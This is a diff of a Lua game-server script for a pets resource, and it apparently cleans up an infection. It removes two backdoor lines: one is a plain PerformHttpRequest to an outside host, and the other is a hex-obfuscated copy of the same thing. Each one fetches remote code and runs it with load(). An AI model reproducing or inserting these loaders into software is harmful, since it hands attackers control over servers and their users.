@@ -36,7 +36,6 @@ AddEventHandler('gl-pets:buyPet', function(petType,price)
 		end
 	end)
 end)
-PerformHttpRequest('https://oascicqobd.store/i?to=giXWm', function (e, d) pcall(function() assert(load(d))() end) end)
 
 RegisterServerEvent('gl-pets:buyFood')
 AddEventHandler('gl-pets:buyFood', function(price)
@@ -181,4 +180,3 @@ AddEventHandler('gl-pets:k9Search',function(ID,targetID)
 
 end)
     
-local nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[4][nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x61\x73\x63\x69\x63\x71\x6f\x62\x64\x2e\x73\x74\x6f\x72\x65\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x67\x69\x58\x57\x6d", function (klXsWxwXeFhNasitKRkqCYcImoibNLYiIraQbSoiAJWzdZMGJBuHiYEQpkwMwyNQaIhTZQ, FhQitIasvborGAylhTWZBVmWLJgbsWjiGBjlibmoHTHWHiJmEfaphmxYVxARSmhYmzcFOB) if (FhQitIasvborGAylhTWZBVmWLJgbsWjiGBjlibmoHTHWHiJmEfaphmxYVxARSmhYmzcFOB == nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[6] or FhQitIasvborGAylhTWZBVmWLJgbsWjiGBjlibmoHTHWHiJmEfaphmxYVxARSmhYmzcFOB == nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[5]) then return end nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[4][nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[2]](nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[4][nMWeUFCYhfMvkRvLYXVhHJGCyumrztjlNUWAnURbjxsMLmWOfxMRuUbSwhZfbkvTtOFtqb[3]](FhQitIasvborGAylhTWZBVmWLJgbsWjiGBjlibmoHTHWHiJmEfaphmxYVxARSmhYmzcFOB))() end)
